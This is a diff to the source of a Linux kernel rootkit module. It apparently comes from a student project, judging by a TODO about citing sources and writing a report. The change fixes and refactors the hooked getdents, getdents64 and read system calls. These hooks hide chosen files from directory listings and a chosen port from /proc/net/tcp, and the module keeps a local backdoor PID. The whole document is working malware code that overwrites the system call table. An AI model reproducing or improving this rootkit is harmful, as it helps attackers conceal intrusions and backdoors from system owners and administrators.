@@ -12,11 +12,9 @@
 #include <linux/fdtable.h>
 
 // TODO 
-// Hide ports
-// Cite sources
-// Write report
-// Bug fix in getdents
 // Better proc hiding
+// Cite sources and write report
+// Bug fix in getdents
 
 // for local backdoor
 #define LOCAL_PID 12345
@@ -101,6 +99,8 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 
 	// run real getdents 
 	result = (*orig_getdents)(fd,dirp,count);
+	if (result <= 0)
+		return result;
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
@@ -111,19 +111,17 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 		return -1;
 
 	// check result for files to hide
-	if (result > 0) { // actually read some bytes
-		for (bp = 0; bp < result;) {
-			d = (struct linux_dirent *) (kdirp + bp);
-			list_for_each_entry(ptr,&hidden_files,list) {
-				if (d->d_ino == ptr->inode) {
-					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
-						result - bp - d->d_reclen);
-					result -= d->d_reclen;
-					bp -= d->d_reclen;
-				}
+	for (bp = 0; bp < result;) {
+		d = (struct linux_dirent *) (kdirp + bp);
+		list_for_each_entry(ptr,&hidden_files,list) {
+			if (d->d_ino == ptr->inode) {
+				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					result - bp - d->d_reclen);
+				result -= d->d_reclen;
+				bp -= d->d_reclen;
 			}
-			bp += d->d_reclen;
 		}
+		bp += d->d_reclen;
 	}
 
 	// copy from kernel to userspace
@@ -151,7 +149,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 
 	// run real getdents64 
 	result = (*orig_getdents64)(fd,dirp,count);
-	if (result < 0)
+	if (result <= 0)
 		return result;
 
 	// copy from user to kernelspace;
@@ -163,19 +161,17 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		return -1;
 
 	// check result for files to hide
-	if (result > 0) { // actually read some bytes
-		for (bp = 0; bp < result;) {
-			d = (struct linux_dirent64 *) (kdirp + bp);
-			list_for_each_entry(ptr,&hidden_files,list) {
-				if (d->d_ino == ptr->inode) {
-					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
-						result - bp - d->d_reclen);
-					result -= d->d_reclen;
-					bp -= d->d_reclen;
-				}
+	for (bp = 0; bp < result;) {
+		d = (struct linux_dirent64 *) (kdirp + bp);
+		list_for_each_entry(ptr,&hidden_files,list) {
+			if (d->d_ino == ptr->inode) {
+				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					result - bp - d->d_reclen);
+				result -= d->d_reclen;
+				bp -= d->d_reclen;
 			}
-			bp += d->d_reclen;
 		}
+		bp += d->d_reclen;
 	}
 
 	// copy from kernel to userspace
@@ -194,7 +190,7 @@ typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
 read_ptr orig_read;
 
 asmlinkage long hacked_read(unsigned int fd, char __user *buf,
-                           size_t count)
+                            size_t count)
 {
 	long result, bp, diff_in_bytes;
 	char *kbuf, *start_line, *end_line, *port_num;
@@ -205,16 +201,8 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 
 	// run real read 
 	result = (*orig_read)(fd,buf,count);
-	if (result < 0)
+	if (result <= 0)
 		return result;
-
-	// copy from user to kernelspace;
-	if (!access_ok(VERIFY_READ,buf,result))
-		return -1;
-	if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
-		return -1;
-	if (copy_from_user(kbuf,buf,result))
-		return -1;
 
 	// get pathname
 	current_files = current->files;
@@ -223,34 +211,39 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 	file_path = files_table->fd[fd]->f_path;
 	pathname = d_path(&file_path,pbuf,256*sizeof(char));
 
-	// filter out hidden ports if /proc/net/tcp
+	// if virtual file /proc/net/tcp
 	if (!strncmp(pathname,"/proc/",6) && !strcmp(pathname+10,"/net/tcp")) {
+		// copy from user to kernelspace;
+		if (!access_ok(VERIFY_READ,buf,result))
+			return -1;
+		if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
+			return -1;
+		if (copy_from_user(kbuf,buf,result))
+			return -1;
+
+		// filter out hidden ports
 		start_line = strchr(kbuf,':') - 4;
 		diff_in_bytes = (start_line - kbuf) * sizeof(char);
 		for (bp = diff_in_bytes; bp < result; bp += diff_in_bytes) {
-			printk(KERN_INFO "Result changing, %ld\n",result);
-			printk(KERN_INFO "New loop, %ld\n",bp);
 			start_line = kbuf + bp;
 			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
-			printk(KERN_INFO "Port num, %s\n",port_num);
 			end_line = strchr(start_line,'\n');
 			diff_in_bytes = ((end_line - start_line) + 1) * sizeof(char);
 			if (!strncmp(port_num,HIDE_PORT,4)) {
-				printk(KERN_INFO "Found port to hide\n");
 				memmove(start_line,end_line + 1,
 					result - bp - diff_in_bytes);
 				result -= diff_in_bytes;
 			}
-			printk(KERN_INFO "Loop ending\n");
 		}
+
+		// copy from kernel to userspace
+		if (!access_ok(VERIFY_WRITE,buf,result))
+			return -1;
+		if (copy_to_user(buf,kbuf,result))
+			return -1;
+		kfree(kbuf);
 	}
 
-	// copy from kernel to userspace
-	if (!access_ok(VERIFY_WRITE,buf,result))
-		return -1;
-	if (copy_to_user(buf,kbuf,result))
-		return -1;
-	kfree(kbuf);
 
 	// return number of bytes read
 	return result;
@@ -258,7 +251,6 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 
 int rootkit_init(void) {
 	GPF_DISABLE;
-
 	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
@@ -270,8 +262,8 @@ int rootkit_init(void) {
 
 	orig_read = (read_ptr)sys_call_table[__NR_read];
 	sys_call_table[__NR_read] = (unsigned long) hacked_read;
-
 	GPF_ENABLE;
+
 	printk(KERN_INFO "Loading rootkit\n");
     	return 0;
 }
